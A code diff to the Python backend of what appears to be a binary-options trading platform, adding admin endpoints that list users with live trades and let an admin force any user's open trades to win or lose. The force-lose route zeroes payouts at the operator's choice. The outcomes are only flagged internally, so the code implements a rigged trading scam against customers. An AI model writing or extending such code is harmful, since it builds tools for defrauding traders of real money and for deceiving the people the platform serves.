@@ -1790,4 +1790,117 @@ async def admin_toggle_trading(user_id: str, admin: dict = Depends(require_admin
     await db.users.update_one({"id": user_id}, {"$set": {"trading_enabled": new_val}})
     return {"ok": True, "trading_enabled": new_val}
 
+
+# ============ ONLINE STATUS (Real-time Trading Users) ============
+@api.get("/admin/online-trading")
+async def admin_online_trading(admin: dict = Depends(require_admin)):
+    """Return all users who are currently trading (have active binary trades)."""
+    active_trades = await db.binary_trades.find(
+        {"status": "active"},
+        {"_id": 0}
+    ).sort("created_at", -1).to_list(500)
+    
+    # Enrich with user info
+    result = []
+    for trade in active_trades:
+        user = await db.users.find_one(
+            {"id": trade["user_id"]},
+            {"_id": 0, "password_hash": 0}
+        )
+        if user:
+            result.append({
+                "trade_id": trade["id"],
+                "user_id": user["id"],
+                "username": user["username"],
+                "email": user["email"],
+                "symbol": trade["symbol"],
+                "amount_usd": trade["amount_usd"],
+                "direction": trade["direction"],
+                "entry_price": trade.get("entry_price", 0),
+                "created_at": trade["created_at"],
+                "expires_at": trade["expires_at"],
+                "duration": trade["duration"],
+            })
+    
+    return result
+
+
+@api.post("/admin/users/{user_id}/force-win")
+async def admin_force_win(user_id: str, admin: dict = Depends(require_admin)):
+    """Force user's active trades to WIN (100% profit)."""
+    # Find active trades for this user
+    active_trades = await db.binary_trades.find(
+        {"user_id": user_id, "status": "active"},
+        {"_id": 0}
+    ).to_list(100)
+    
+    if not active_trades:
+        raise HTTPException(status_code=404, detail="No active trades for this user")
+    
+    count = 0
+    for trade in active_trades:
+        amount = float(trade["amount_usd"])
+        profit_rate = float(trade.get("profit_rate", 0.02))
+        profit = amount * profit_rate
+        payout = amount + profit
+        
+        # Complete the trade with WIN result
+        flip = await db.binary_trades.update_one(
+            {"id": trade["id"], "status": "active"},
+            {"$set": {
+                "status": "completed",
+                "completed_at": datetime.now(timezone.utc).isoformat(),
+                "profit": profit,
+                "payout": payout,
+                "result": "win",
+                "admin_forced": True,
+            }},
+        )
+        
+        if flip.modified_count > 0:
+            # Credit user balance
+            await db.users.update_one(
+                {"id": user_id},
+                {"$inc": {"balances.USDT": payout}},
+            )
+            count += 1
+    
+    return {"ok": True, "forced_wins": count}
+
+
+@api.post("/admin/users/{user_id}/force-lose")
+async def admin_force_lose(user_id: str, admin: dict = Depends(require_admin)):
+    """Force user's active trades to LOSE (100% loss)."""
+    # Find active trades for this user
+    active_trades = await db.binary_trades.find(
+        {"user_id": user_id, "status": "active"},
+        {"_id": 0}
+    ).to_list(100)
+    
+    if not active_trades:
+        raise HTTPException(status_code=404, detail="No active trades for this user")
+    
+    count = 0
+    for trade in active_trades:
+        amount = float(trade["amount_usd"])
+        
+        # Complete the trade with LOSS result
+        flip = await db.binary_trades.update_one(
+            {"id": trade["id"], "status": "active"},
+            {"$set": {
+                "status": "completed",
+                "completed_at": datetime.now(timezone.utc).isoformat(),
+                "profit": -amount,
+                "payout": 0.0,
+                "result": "loss",
+                "admin_forced": True,
+            }},
+        )
+        
+        if flip.modified_count > 0:
+            count += 1
+    
+    return {"ok": True, "forced_losses": count}
+
+
 app.include_router(api)
